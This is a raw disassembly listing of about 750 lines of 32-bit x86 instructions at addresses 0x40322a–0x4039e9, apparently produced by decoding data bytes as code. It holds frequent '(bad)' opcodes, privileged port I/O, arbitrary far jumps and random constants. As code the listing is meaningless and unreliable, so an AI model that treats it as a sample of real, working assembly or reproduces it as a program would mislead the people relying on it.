  40322a:	mov    ah,0x6f
  40322c:	add    al,0xf6
  40322e:	sub    BYTE PTR ds:0xca8db3c5,dl
  403234:	mov    ebp,DWORD PTR [ebp+0x4]
  403237:	and    dl,BYTE PTR [ebp+edx*1-0x9]
  40323b:	add    eax,DWORD PTR [ebx-0x6cb257d7]
  403241:	mov    bl,cl
  403243:	sbb    bh,BYTE PTR [edx-0x52]
  403246:	popa   
  403247:	mov    ebx,esi
  403249:	inc    esp
  40324a:	(bad)  
  40324b:	fldenv [ebx]
  40324d:	sbb    BYTE PTR [edi-0x56c81e67],0x37
  403254:	pusha  
  403255:	sub    ebp,DWORD PTR [ebp-0x3b0cc1d0]
  40325b:	push   ebp
  40325c:	mov    ecx,ecx
  40325e:	fsub   QWORD PTR [ebp-0x7b]
  403261:	cli    
  403262:	sbb    al,0x60
  403264:	dec    eax
  403265:	inc    ebx
  403266:	mov    fs,WORD PTR [ecx+0x2]
  403269:	es cmc 
  40326b:	aas    
  40326c:	mov    DWORD PTR [eax+0xa],ecx
  40326f:	popf   
  403270:	ja     0x40320e
  403272:	cmp    ch,dl
  403274:	mov    edx,0x8af2de97
  403279:	aaa    
  40327a:	adc    cl,BYTE PTR [ebx]
  40327c:	aas    
  40327d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40327e:	test   eax,0x6b40ef9e
  403283:	lock test al,0xf7
  403286:	push   esp
  403287:	repz cld 
  403289:	retf   0xe2b1
  40328c:	out    0x59,al
  40328e:	add    ebp,DWORD PTR ds:0xa502fc2a
  403294:	loop   0x403232
  403296:	pinsrw mm0,eax,0x54
  40329a:	mov    esi,0x934d13c0
  40329f:	std    
  4032a0:	cs call 0xb194:0x636d7774
  4032a8:	pushf  
  4032a9:	xchg   edx,eax
  4032aa:	xchg   ecx,eax
  4032ab:	mov    dl,0x73
  4032ad:	push   esi
  4032ae:	in     eax,dx
  4032af:	pusha  
  4032b0:	test   BYTE PTR [ebp-0x5d],ch
  4032b3:	clc    
  4032b4:	and    bh,BYTE PTR [esi]
  4032b6:	push   ebp
  4032b7:	mov    ebx,0xa60e88bb
  4032bc:	and    al,0x6
  4032be:	das    
  4032bf:	dec    ebx
  4032c1:	pop    ecx
  4032c2:	or     edi,DWORD PTR [edi+0x13]
  4032c5:	(bad)  
  4032c6:	lea    ebx,[esi+ebp*8+0x1]
  4032ca:	jb     0x40332d
  4032cc:	addr16 hlt 
  4032ce:	and    al,0x2b
  4032d0:	dec    eax
  4032d1:	push   ss
  4032d2:	inc    edx
  4032d3:	sbb    BYTE PTR [ebx-0x21],cl
  4032d6:	ins    BYTE PTR es:[edi],dx
  4032d7:	leave  
  4032d8:	sub    ebx,esi
  4032da:	hlt    
  4032db:	shl    BYTE PTR [edx+0x2b],0x2d
  4032df:	adc    bh,BYTE PTR [ecx]
  4032e1:	sbb    eax,0x8e79b671
  4032e6:	out    dx,eax
  4032e7:	or     esi,ecx
  4032e9:	add    al,0x3c
  4032eb:	data16 adc al,BYTE PTR [ecx]
  4032ee:	(bad)  
  4032ef:	or     al,bl
  4032f1:	imul   esi,ebx,0xf8bf18b4
  4032f7:	rcr    BYTE PTR [eax],1
  4032f9:	sub    dl,BYTE PTR [edx+0x13]
  4032fc:	mov    ecx,0x202397a8
  403301:	jno    0x403320
  403303:	or     ebp,DWORD PTR [ebx+0x4b]
  403306:	enter  0x83e0,0x73
  40330a:	xor    edi,ecx
  40330c:	out    0x7f,al
  40330e:	pop    edx
  40330f:	loopne 0x403336
  403311:	test   DWORD PTR [ebp-0x2e25bd6],0x24d6bcee
  40331b:	int3   
  40331c:	jns    0x4032cd
  40331e:	sbb    al,0xce
  403320:	and    DWORD PTR [edx-0x4ba20310],esp
  403326:	mov    dh,0x4a
  403328:	das    
  403329:	or     BYTE PTR ds:0x8e8ff122,0xac
  403330:	dec    eax
  403331:	adc    eax,edi
  403333:	mov    ah,0x96
  403335:	lods   al,BYTE PTR ds:[esi]
  403336:	lea    esp,[edi+ecx*2-0x2be3d97c]
  40333d:	mov    eax,0xf03b0290
  403342:	jge    0x403392
  403344:	dec    ebp
  403345:	push   esi
  403346:	push   ecx
  403347:	(bad)  
  403348:	in     al,0x38
  40334a:	in     al,dx
  40334b:	push   ds
  40334c:	inc    ecx
  40334d:	sbb    cl,dl
  40334f:	icebp  
  403350:	ja     0x40331e
  403352:	mov    edi,0x3768679d
  403357:	gs pop ecx
  403359:	xor    dl,BYTE PTR [ebx]
  40335b:	lock cmp eax,0xee44bdbd
  403361:	ret    0x5f4b
  403364:	test   al,0xbc
  403366:	pop    ds
  403367:	add    dh,BYTE PTR [esi-0x3c]
  40336a:	pop    ecx
  40336b:	xor    dl,bl
  40336d:	lods   al,BYTE PTR ds:[esi]
  40336e:	mov    dh,0x82
  403370:	ret    0xb632
  403373:	das    
  403374:	out    0x1b,al
  403376:	mov    al,ds:0x222307c2
  40337b:	stos   BYTE PTR es:[edi],al
  40337c:	pop    ebp
  40337d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40337e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40337f:	push   ebx
  403380:	cwde   
  403381:	in     al,0xcd
  403383:	add    eax,0x94c08e95
  403388:	mov    ch,0xea
  40338a:	mov    bl,0x74
  40338c:	rcl    BYTE PTR [ebx+eiz*1-0x75],cl
  403390:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403391:	lods   eax,DWORD PTR ds:[esi]
  403392:	sar    al,cl
  403394:	int3   
  403395:	dec    edx
  403396:	or     eax,0xa573dba0
  40339b:	int3   
  40339c:	mov    dh,0x98
  40339e:	inc    esp
  40339f:	push   0xffffffe3
  4033a1:	and    dh,BYTE PTR [edi-0x541141b2]
  4033a7:	pop    esp
  4033a8:	add    al,0x54
  4033aa:	cmp    al,0x3e
  4033ac:	push   0xffffff8e
  4033ae:	jbe    0x40337f
  4033b0:	pushf  
  4033b1:	ror    edi,0xdf
  4033b4:	scas   eax,DWORD PTR es:[edi]
  4033b5:	call   0xcc254374
  4033ba:	ds repz out 0xdb,eax
  4033be:	cwde   
  4033bf:	cmp    DWORD PTR [esi],esi
  4033c1:	adc    al,0x56
  4033c3:	pop    edi
  4033c4:	imul   ebx,esp,0x40
  4033c7:	jle    0x403414
  4033c9:	shl    al,0xca
  4033cc:	cld    
  4033cd:	out    dx,eax
  4033ce:	inc    esp
  4033cf:	jmp    0xee3d9e81
  4033d4:	push   ebx
  4033d5:	xchg   edx,eax
  4033d6:	sahf   
  4033d7:	xchg   ebx,eax
  4033d8:	push   ss
  4033d9:	bnd jmp 0x293778f8
  4033df:	mov    esp,0xdb819ec9
  4033e4:	mov    dh,0x49
  4033e6:	xchg   ebp,eax
  4033e7:	jle    0x4033f8
  4033e9:	retf   0xc934
  4033ec:	inc    esp
  4033ed:	fld    DWORD PTR [ecx+0x6a]
  4033f0:	mov    eax,DWORD PTR [ebx-0x2]
  4033f3:	and    DWORD PTR [ecx+eiz*1],ebp
  4033f6:	stos   BYTE PTR es:[edi],al
  4033f7:	lock rol DWORD PTR [eax-0x3],1
  4033fb:	enter  0x3a41,0x71
  4033ff:	iret   
  403400:	mov    ds:0x73b9f20c,al
  403405:	jnp    0x403414
  403407:	pop    esi
  403408:	sbb    DWORD PTR [eax+eiz*4],0x231f091e
  40340f:	sub    al,0xe7
  403411:	xor    ch,BYTE PTR [ecx]
  403413:	aaa    
  403414:	ret    
  403415:	stc    
  403416:	pop    eax
  403417:	push   ebp
  403418:	ret    0x1883
  40341b:	in     al,0x36
  40341d:	push   ds
  40341e:	outs   dx,DWORD PTR ds:[esi]
  40341f:	cli    
  403420:	out    dx,eax
  403421:	es js  0x40345f
  403424:	cmp    bh,BYTE PTR [esi]
  403426:	sbb    BYTE PTR [edx],0xa1
  403429:	jno    0x4033c1
  40342b:	fdiv   st,st(4)
  40342d:	lods   al,BYTE PTR ds:[esi]
  40342e:	jns    0x4033c7
  403430:	xor    ah,BYTE PTR [ecx+0x2b]
  403433:	or     BYTE PTR [edi],ah
  403435:	(bad)  
  403436:	cld    
  403437:	adc    BYTE PTR [edx],dl
  403439:	dec    eax
  40343a:	pop    esi
  40343b:	iret   
  40343c:	leave  
  40343d:	and    edi,ecx
  40343f:	lahf   
  403440:	and    DWORD PTR [ecx],edi
  403442:	lea    eax,[ebx+0x3e34effc]
  403448:	fcomp  QWORD PTR [esp]
  40344b:	mov    edi,gs
  40344d:	or     BYTE PTR [ecx-0x7f],0x4b
  403451:	xchg   esp,eax
  403452:	into   
  403453:	xor    BYTE PTR [ebx-0x26],bl
  403456:	jmp    0x4033e6
  403458:	and    eax,0x80993b79
  40345d:	xchg   esi,eax
  40345e:	push   esi
  40345f:	lods   al,BYTE PTR ds:[esi]
  403460:	lods   al,BYTE PTR ds:[esi]
  403461:	mov    ch,0x38
  403463:	cwde   
  403464:	mov    edx,0x2f74e70
  403469:	das    
  40346a:	or     al,0xae
  40346c:	int3   
  40346d:	jp     0x4034d4
  40346f:	mov    WORD PTR ds:[ebp-0x58c0a88e],gs
  403476:	pop    ss
  403477:	addr16 loope 0x4034ac
  40347a:	mov    ebp,0xf9606c5c
  40347f:	xchg   edx,eax
  403480:	scas   eax,DWORD PTR es:[edi]
  403481:	aad    0xf9
  403483:	(bad)  
  403484:	push   ss
  403485:	iret   
  403486:	inc    ebx
  403487:	fmul   DWORD PTR [ebp+0x5c]
  40348a:	aad    0x14
  40348c:	push   esp
  40348d:	sub    BYTE PTR [eax],0x31
  403490:	cmc    
  403491:	or     edx,0x71e082ae
  403497:	lock outs dx,BYTE PTR ds:[esi]
  403499:	dec    ecx
  40349a:	mov    DWORD PTR [esi],edx
  40349c:	jp     0x403464
  40349e:	cmp    DWORD PTR [ecx+0x0],edx
  4034a1:	les    eax,FWORD PTR [ebx-0x71ce38c7]
  4034a7:	cmc    
  4034a8:	inc    ebp
  4034a9:	cmp    al,0xf4
  4034ab:	addr16 aam 0x5f
  4034ae:	sbb    dh,ch
  4034b0:	in     eax,0x13
  4034b2:	jle    0x403487
  4034b4:	push   eax
  4034b5:	ja     0x403474
  4034b7:	sbb    ah,dl
  4034b9:	ret    0x7710
  4034bc:	test   al,0xe9
  4034be:	icebp  
  4034bf:	test   BYTE PTR [edx-0x4eb5376e],0x82
  4034c6:	add    esp,DWORD PTR [edx]
  4034c8:	dec    ebp
  4034c9:	out    dx,eax
  4034ca:	js     0x403458
  4034cc:	addr16 inc eax
  4034ce:	cmp    ecx,DWORD PTR [ebx]
  4034d0:	and    esp,esp
  4034d2:	test   BYTE PTR [edi-0x2f1139bc],dh
  4034d8:	jno    0x403472
  4034da:	xchg   DWORD PTR [ebp+esi*8+0x10],esi
  4034de:	mov    ch,ah
  4034e0:	or     BYTE PTR [esi],ah
  4034e2:	jbe    0x403544
  4034e4:	ins    DWORD PTR es:[edi],dx
  4034e5:	dec    ebp
  4034e6:	or     edi,DWORD PTR [ebx-0x3d6a6294]
  4034ec:	xchg   BYTE PTR ds:0x41044155,dl
  4034f2:	(bad)  [esi+0x1bd85f1e]
  4034f8:	jnp    0x403526
  4034fa:	cs imul esi,esi,0x8361e43f
  403501:	or     dh,BYTE PTR [esi]
  403503:	adc    DWORD PTR [edi],0xffffffb6
  403506:	or     ah,bh
  403508:	dec    edx
  403509:	retf   
  40350a:	sbb    al,BYTE PTR [edx]
  40350c:	jl     0x4034d7
  40350e:	add    eax,0x1e0b3985
  403513:	jmp    0x4034b8
  403515:	sub    DWORD PTR [ecx],0xffffffc8
  403518:	xor    DWORD PTR [ebx+ecx*8],0xffffffcb
  40351c:	jmp    0x6d8:0x66d1a204
  403523:	and    DWORD PTR [eax-0x66a1e37b],ebx
  403529:	xor    ebp,DWORD PTR [eax-0x4bbbd215]
  40352f:	dec    eax
  403530:	ds mov ecx,0xee4e264
  403536:	jo     0x40357e
  403538:	es dec edi
  40353a:	pop    edi
  40353b:	rcr    BYTE PTR [ecx+esi*1+0x52],0xe5
  403540:	test   eax,0xdb4aa07e
  403545:	push   eax
  403546:	xchg   edx,eax
  403547:	lods   eax,DWORD PTR ds:[esi]
  403548:	lahf   
  403549:	cwde   
  40354a:	mov    ds:0xa8e4c313,al
  40354f:	iret   
  403550:	xchg   ebx,eax
  403551:	cdq    
  403552:	or     al,cl
  403554:	push   esi
  403555:	and    BYTE PTR [eax-0x7d],bh
  403558:	ret    0x62f4
  40355b:	pop    ecx
  40355c:	jbe    0x403589
  40355e:	out    0x43,al
  403560:	sub    eax,0x75edfa6d
  403565:	test   al,0xab
  403567:	xchg   edi,eax
  403568:	lock cld 
  40356a:	mov    DWORD PTR [bp+si+0x3388],edi
  40356f:	xchg   esi,eax
  403570:	mov    ebx,edx
  403572:	mov    ah,0xa
  403574:	imul   esp,DWORD PTR [esi+0x50]
  403578:	adc    DWORD PTR [edx-0x489690b0],edx
  40357e:	mov    ds:0xa3397e1d,eax
  403583:	jae    0x4035fc
  403585:	mov    edx,0xec8cbde7
  40358a:	push   edi
  40358b:	fld    QWORD PTR [edx-0x795722ab]
  403591:	mov    esi,0x3e302925
  403596:	pop    eax
  403598:	add    al,BYTE PTR [eax]
  40359a:	out    0xc1,eax
  40359c:	clc    
  40359d:	add    DWORD PTR [ebx+0x4fe0004a],edi
  4035a3:	adc    ebp,DWORD PTR [eax-0x3f]
  4035a6:	xchg   esp,eax
  4035a7:	xor    DWORD PTR [esi],0xffffffe4
  4035aa:	mov    dl,BYTE PTR [ebp+0x746e4e5c]
  4035b0:	clc    
  4035b1:	and    eax,0x9ccfed6c
  4035b6:	es out 0x9c,eax
  4035b9:	lock lds ebx,FWORD PTR [edi]
  4035bc:	inc    eax
  4035bd:	mov    ah,0x23
  4035bf:	imul   edi,DWORD PTR [edx],0xffffffc4
  4035c2:	mov    esi,0x78ca58b1
  4035c7:	repz imul edx,DWORD PTR [edx+0x1771ba],0x64ecf1d1
  4035d2:	dec    ebx
  4035d3:	std    
  4035d4:	(bad)  
  4035d5:	mov    edi,0xbfad6c0f
  4035da:	sub    BYTE PTR [esi],0x5d
  4035dd:	pop    ecx
  4035de:	fs aas 
  4035e0:	(bad)  
  4035e1:	and    al,0xa3
  4035e3:	cmp    eax,0x8e3ffd1f
  4035e8:	cmp    BYTE PTR [esi+0x7d4fc98a],0xe8
  4035ef:	and    bl,bl
  4035f1:	ficomp DWORD PTR [esi+eax*8]
  4035f4:	pop    edi
  4035f5:	mov    ebp,0xa7adc2f6
  4035fa:	mov    esp,0x1849d7ea
  4035ff:	mov    eax,esp
  403601:	ret    0x11e9
  403604:	sbb    eax,0x6139a14a
  403609:	loope  0x4035db
  40360b:	outs   dx,BYTE PTR ds:[esi]
  40360c:	mov    cl,dl
  40360e:	or     al,0xbd
  403610:	in     eax,0xc8
  403612:	pop    ebp
  403613:	scas   eax,DWORD PTR es:[edi]
  403614:	push   ebx
  403615:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403616:	div    BYTE PTR [esi*1-0x6e274b8c]
  40361d:	jecxz  0x40361f
  40361f:	shl    esi,cl
  403621:	push   ecx
  403622:	retf   
  403623:	or     eax,0xb82db6d9
  403628:	sar    esp,cl
  40362a:	jle    0x4035ba
  40362c:	or     bh,dl
  40362e:	cmp    bl,BYTE PTR [esp+edi*4-0x5546568c]
  403635:	(bad)  
  403636:	div    ch
  403638:	in     eax,dx
  403639:	fist   DWORD PTR [edx]
  40363b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40363c:	cmc    
  40363d:	sub    bl,dh
  40363f:	fs pusha 
  403641:	adc    cl,BYTE PTR [edx-0x7abb49fe]
  403647:	jbe    0x4035dd
  403649:	cld    
  40364a:	jnp    0x4035e1
  40364c:	sub    ebx,DWORD PTR [ecx-0x7f7c93ce]
  403652:	sbb    eax,DWORD PTR [ebx]
  403654:	or     DWORD PTR [ebp-0x46],esp
  403657:	mul    DWORD PTR [ebx+0x3c27eac6]
  40365d:	dec    ebp
  40365e:	and    BYTE PTR [edx+edi*8],0x40
  403662:	xchg   DWORD PTR [edi-0xac7a0b0],esp
  403668:	mov    ecx,DWORD PTR [esi-0x47]
  40366b:	mov    ah,0x44
  40366d:	push   0x45
  40366f:	(bad)  
  403671:	jno    0x40365e
  403673:	shr    DWORD PTR [edx-0x1d],cl
  403676:	(bad)  
  403677:	das    
  403678:	shl    BYTE PTR [edi-0x29],1
  40367b:	xor    DWORD PTR [esi+0x18],esp
  40367e:	arpl   WORD PTR [ebx],dx
  403680:	imul   esi,ebp,0xa650b74
  403686:	dec    esi
  403687:	lods   eax,DWORD PTR ds:[esi]
  403688:	adc    esi,DWORD PTR [eax+eax*8-0x69]
  40368c:	ja     0x403647
  40368e:	push   eax
  40368f:	inc    ecx
  403690:	xlat   BYTE PTR ds:[ebx]
  403691:	xchg   esp,eax
  403692:	cmp    eax,DWORD PTR [eax-0x6b247104]
  403698:	jmp    0x222:0x1cfc50b6
  40369f:	(bad)  
  4036a0:	out    dx,eax
  4036a1:	xchg   DWORD PTR [edi-0x2b5d6a2c],eax
  4036a7:	mov    cl,0x5f
  4036a9:	jg     0x40364c
  4036ab:	pushf  
  4036ac:	sub    al,0xc
  4036ae:	lea    eax,[eax-0x73]
  4036b1:	jmp    0x403654
  4036b3:	or     ebp,DWORD PTR [eax+0x24642914]
  4036b9:	popa   
  4036ba:	mov    al,ds:0xaf55cbdd
  4036bf:	push   ebx
  4036c0:	xchg   ebx,eax
  4036c1:	cld    
  4036c2:	gs pop edi
  4036c4:	cmp    eax,0x8ad7590d
  4036c9:	dec    esp
  4036ca:	cmp    BYTE PTR ds:0x93a01624,al
  4036d0:	ret    
  4036d1:	call   0x23e3:0xa3a32231
  4036d8:	jns    0x4036aa
  4036da:	mov    ch,0xf0
  4036dc:	ret    0xcb3c
  4036df:	xor    BYTE PTR [eax],cl
  4036e1:	sbb    eax,0x199b4a70
  4036e6:	lock stc 
  4036e8:	loop   0x40370c
  4036ea:	test   BYTE PTR [ebp+esi*1-0x19],dl
  4036ee:	inc    edx
  4036ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036f0:	mov    ah,0x63
  4036f2:	inc    ebx
  4036f3:	aaa    
  4036f4:	dec    ebp
  4036f5:	pop    edi
  4036f6:	retf   
  4036f7:	repz push ebx
  4036f9:	sar    DWORD PTR [edx+ecx*1],cl
  4036fc:	sub    ecx,DWORD PTR [edi+edx*4+0x62]
  403700:	dec    esp
  403701:	xlat   BYTE PTR ds:[ebx]
  403702:	jns    0x4036e1
  403704:	push   cs
  403705:	fidivr DWORD PTR [edi-0x6a]
  403708:	iret   
  403709:	rcr    BYTE PTR [ebp+0x68141fe2],0x76
  403710:	fidiv  DWORD PTR [eax-0x5d]
  403713:	mov    cl,0xf4
  403715:	dec    esp
  403716:	adc    al,0x7e
  403718:	sub    BYTE PTR [esi-0x58],al
  40371b:	jp     0x4036d9
  40371d:	mov    edx,0xb0971e50
  403722:	ss xchg esp,eax
  403724:	rcl    DWORD PTR [eax-0x31],cl
  403727:	or     dl,BYTE PTR [eax+0x6bb955d3]
  40372d:	cmp    eax,0x39e08ef
  403732:	ret    
  403733:	jecxz  0x403798
  403735:	sub    DWORD PTR [ecx+ebx*1+0x19],edi
  403739:	iret   
  40373a:	pop    esi
  40373b:	fidivr DWORD PTR [ebp+0x22af05d1]
  403741:	test   BYTE PTR [ebx-0x3b],al
  403744:	mov    ch,0xdb
  403746:	xchg   esp,eax
  403747:	push   esi
  403748:	(bad)  
  403749:	and    BYTE PTR [edx+0x5b],dl
  40374c:	dec    ebp
  40374d:	mov    ah,BYTE PTR [edx-0x2f]
  403750:	pop    ss
  403751:	test   eax,0xad07e28c
  403756:	xchg   ecx,eax
  403757:	mov    BYTE PTR [edx+edi*4-0x4bd4ca63],bl
  40375e:	sub    dl,BYTE PTR [ebp-0x6c]
  403761:	lock test eax,0xba4621da
  403767:	shl    BYTE PTR ds:0xece712a5,cl
  40376d:	ror    BYTE PTR [ebx+0x54978ec3],1
  403773:	adc    dh,BYTE PTR [edx-0x6a]
  403776:	inc    eax
  403777:	outs   dx,DWORD PTR ds:[esi]
  403778:	fwait
  403779:	scas   al,BYTE PTR es:[edi]
  40377a:	repz add al,0x88
  40377d:	xchg   ebx,eax
  40377e:	pushw  es
  403780:	jecxz  0x4037f0
  403782:	stos   BYTE PTR es:[edi],al
  403783:	mov    edx,0x49373526
  403788:	daa    
  403789:	cmp    bl,cl
  40378b:	xchg   ebp,eax
  40378c:	xchg   ebx,eax
  40378d:	retf   0x7a3e
  403790:	sbb    esi,esi
  403792:	xor    edi,edx
  403794:	mov    esi,es
  403796:	mov    al,0x5d
  403798:	addr16 mov ds:0x90a1,eax
  40379c:	fwait
  40379d:	mov    ebx,DWORD PTR [edi]
  40379f:	jmp    0x883216cb
  4037a4:	rcl    DWORD PTR [esi-0x40],cl
  4037a7:	jno    0x40377c
  4037a9:	xor    DWORD PTR [edi+0xe0d370d],edx
  4037af:	sbb    al,0xc9
  4037b1:	jmp    0xf3783019
  4037b6:	xchg   edx,eax
  4037b7:	adc    eax,0xe52af76a
  4037bc:	into   
  4037bd:	push   ds
  4037be:	and    al,0xa9
  4037c0:	jp     0x4037ef
  4037c2:	rcr    BYTE PTR [edx+0x4b],cl
  4037c5:	pop    ebx
  4037c6:	lods   al,BYTE PTR ds:[esi]
  4037c7:	popa   
  4037c8:	test   al,0x18
  4037ca:	int3   
  4037cb:	jne    0x403822
  4037cd:	sbb    edi,DWORD PTR [ebx]
  4037cf:	push   eax
  4037d0:	xchg   edi,eax
  4037d1:	xor    cl,0xf5
  4037d4:	in     eax,dx
  4037d5:	or     eax,0xe899a7bb
  4037da:	xchg   ah,ah
  4037dc:	and    eax,0xac8d435e
  4037e1:	sub    DWORD PTR [eax],esi
  4037e3:	sti    
  4037e4:	into   
  4037e5:	pop    esp
  4037e6:	call   0xffc7:0x88655695
  4037ed:	lds    edx,FWORD PTR [esi+eax*1-0x2f]
  4037f1:	je     0x40381f
  4037f3:	mov    edi,0x1c9b3d5
  4037f8:	dec    edi
  4037f9:	cmp    esi,DWORD PTR ds:0x14ab7ef1
  4037ff:	pop    edx
  403800:	(bad)  
  403801:	push   cs
  403802:	imul   esi,DWORD PTR [esi+0x416eea3c],0x6321ea
  40380c:	addr16 mov al,0x73
  40380f:	push   ss
  403810:	inc    esi
  403811:	jp     0x403827
  403813:	das    
  403814:	push   DWORD PTR [eax+0x72]
  403817:	mov    dh,0x59
  403819:	adc    dh,dh
  40381b:	jno    0x40383a
  40381d:	mov    esp,0x8e77f3a6
  403822:	mov    bh,0xf
  403824:	cmp    DWORD PTR [ecx],edi
  403826:	pusha  
  403827:	dec    ebp
  403828:	je     0x403841
  40382a:	iret   
  40382b:	outs   dx,BYTE PTR ds:[esi]
  40382c:	mov    bh,BYTE PTR [ecx+0x4c]
  40382f:	pop    es
  403830:	js     0x40383f
  403832:	jno    0x4037e2
  403834:	test   al,0xdd
  403836:	jge    0x403881
  403838:	pop    edx
  403839:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40383a:	mov    al,0xa6
  40383c:	jg     0x403825
  40383e:	and    al,0xde
  403840:	push   ss
  403841:	sub    bh,BYTE PTR [edi-0x5182fcd9]
  403847:	xor    BYTE PTR [ecx],ch
  403849:	in     al,dx
  40384a:	stos   DWORD PTR es:[edi],eax
  40384b:	push   ebp
  40384c:	popa   
  40384d:	into   
  40384e:	lods   eax,DWORD PTR ds:[esi]
  40384f:	inc    esi
  403850:	div    edx
  403852:	arpl   di,di
  403854:	lods   eax,DWORD PTR ds:[esi]
  403855:	leave  
  403856:	mov    edi,0x1a619495
  40385b:	retf   
  40385c:	les    ebp,FWORD PTR [eax-0x6e4f3b79]
  403862:	arpl   WORD PTR [edx+eiz*4+0x98f0d26],dx
  403869:	pop    ebp
  40386a:	popf   
  40386b:	dec    edi
  40386c:	retf   0x69a5
  40386f:	pop    edx
  403870:	pop    es
  403871:	sbb    DWORD PTR [edx-0x4341f313],ecx
  403877:	les    ecx,FWORD PTR ds:0x4cc29651
  40387d:	adc    bh,cl
  40387f:	mov    al,ds:0xa8a381a4
  403884:	push   eax
  403885:	sub    eax,0xf29f2fe
  40388a:	mov    edi,0x7386a825
  40388f:	jmp    0xfc1bca78
  403894:	mov    cl,0x2f
  403896:	fcomp  DWORD PTR [edi-0x24]
  403899:	push   0xf40453e
  40389e:	scas   eax,DWORD PTR es:[edi]
  40389f:	ror    BYTE PTR [ecx-0x64],cl
  4038a2:	test   DWORD PTR [edx],edx
  4038a4:	leave  
  4038a5:	adc    esp,DWORD PTR [ebx-0x31396f5f]
  4038ab:	cld    
  4038ac:	mov    cl,0xbb
  4038ae:	pop    esi
  4038af:	pop    ss
  4038b0:	sub    ecx,esp
  4038b2:	int3   
  4038b3:	sbb    eax,DWORD PTR [ecx+0x46f669b1]
  4038b9:	mov    esp,0x6d6cb4ad
  4038be:	std    
  4038bf:	pushf  
  4038c0:	int    0xf7
  4038c2:	loope  0x403871
  4038c4:	call   DWORD PTR [ecx]
  4038c6:	jl     0x40384d
  4038c8:	mov    ebx,DWORD PTR [ebp-0xa7af300]
  4038ce:	ins    BYTE PTR es:[edi],dx
  4038cf:	outs   dx,DWORD PTR ds:[esi]
  4038d0:	jns    0x4038b1
  4038d2:	fs inc eax
  4038d4:	pop    ebx
  4038d5:	dec    edi
  4038d6:	or     eax,0x98c7e1af
  4038db:	aaa    
  4038dc:	(bad)  
  4038dd:	orps   xmm3,XMMWORD PTR [edi+0x63]
  4038e1:	jmp    0x98dbd531
  4038e6:	sub    eax,0x351ae86a
  4038eb:	dec    edx
  4038ec:	inc    esp
  4038ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038ee:	xor    al,0xa5
  4038f0:	dec    edi
  4038f1:	int3   
  4038f2:	sub    DWORD PTR [edx],eax
  4038f4:	add    al,0x53
  4038f6:	push   edi
  4038f7:	imul   edi,DWORD PTR [edx],0x3bf21a35
  4038fd:	or     BYTE PTR [edi],dh
  4038ff:	into   
  403900:	fidivr DWORD PTR [edi+ebp*1]
  403903:	xor    edx,ebx
  403905:	aam    0x19
  403907:	sub    bh,BYTE PTR [ecx]
  403909:	xor    DWORD PTR [esi],edi
  40390b:	test   al,0x9f
  40390d:	rcr    BYTE PTR [edi],cl
  40390f:	scas   al,BYTE PTR es:[edi]
  403910:	mov    DWORD PTR [ecx],eax
  403912:	inc    esp
  403913:	fstp   DWORD PTR [eax-0x5a401c91]
  403919:	mov    cl,0x52
  40391b:	jmp    0x4038c5
  40391d:	pop    ds
  40391e:	mov    eax,ds:0xf8e01778
  403923:	loop   0x403999
  403925:	sar    DWORD PTR [eax-0x28],0xb7
  403929:	arpl   WORD PTR [eax-0x35f5ada1],cx
  40392f:	mov    ebp,DWORD PTR [ebp-0x75a710ea]
  403935:	and    al,0x1b
  403937:	fmul   QWORD PTR [edi-0x7b]
  40393a:	clc    
  40393b:	xchg   edx,eax
  40393c:	xor    eax,DWORD PTR [edi+0x4bd5f4b3]
  403942:	popa   
  403943:	push   edi
  403944:	stc    
  403945:	(bad)  
  403946:	mov    al,ds:0x4f9d80a2
  40394b:	sub    ebx,ecx
  40394d:	cmp    al,0x7
  40394f:	retf   0x43ab
  403952:	nop
  403953:	popf   
  403954:	lods   al,BYTE PTR ds:[esi]
  403955:	mov    esi,0xb4cd44b6
  40395a:	mov    al,BYTE PTR [eax+0x1afa81ed]
  403960:	sub    DWORD PTR [ecx],esi
  403962:	xor    eax,0x29c004c9
  403967:	ins    BYTE PTR es:[edi],dx
  403968:	xchg   BYTE PTR [ebp+0x2],ah
  40396b:	cmp    eax,0x9766c671
  403970:	pop    eax
  403971:	cwde   
  403972:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403973:	les    ebx,FWORD PTR ds:0x6351c83b
  403979:	aaa    
  40397a:	jmp    0x403942
  40397c:	cli    
  40397d:	inc    edi
  40397e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40397f:	inc    edx
  403980:	sub    al,0xd3
  403982:	xlat   BYTE PTR ds:[ebx]
  403983:	mov    edx,0xa0364c77
  403988:	adc    DWORD PTR [esi+0x2ab46ea1],esp
  40398e:	cmp    BYTE PTR [ebx+0x15730dc2],ch
  403994:	inc    ecx
  403995:	stos   BYTE PTR es:[edi],al
  403996:	push   eax
  403997:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403998:	test   al,0xdb
  40399a:	adc    ah,BYTE PTR [esp+edx*2-0x5a]
  40399e:	daa    
  40399f:	inc    edx
  4039a0:	sar    BYTE PTR [ebp-0x522e886],0xd5
  4039a7:	jmp    0x30d0:0x8b677dd0
  4039ae:	pusha  
  4039af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039b0:	pop    ss
  4039b1:	popa   
  4039b2:	jp     0x403a1b
  4039b4:	cmp    BYTE PTR [ebx-0x49ba6fab],0x37
  4039bb:	pop    ss
  4039bc:	dec    edx
  4039bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039be:	sbb    bl,dh
  4039c0:	lahf   
  4039c1:	pop    es
  4039c2:	out    dx,eax
  4039c3:	out    0x87,eax
  4039c5:	mov    esi,0xeec075dc
  4039ca:	or     BYTE PTR [ecx+0x5034a82c],bh
  4039d0:	pop    edi
  4039d1:	aam    0xe
  4039d3:	mov    eax,0x222441d8
  4039d8:	dec    sp
  4039da:	jno    0x4039d6
  4039dc:	xchg   edx,eax
  4039dd:	sub    ch,BYTE PTR [esi-0x25cbc578]
  4039e3:	ins    BYTE PTR es:[edi],dx
  4039e4:	pop    edi
  4039e5:	pop    ss
  4039e6:	addr16 mov bh,0xeb
  4039e9:	aaa    
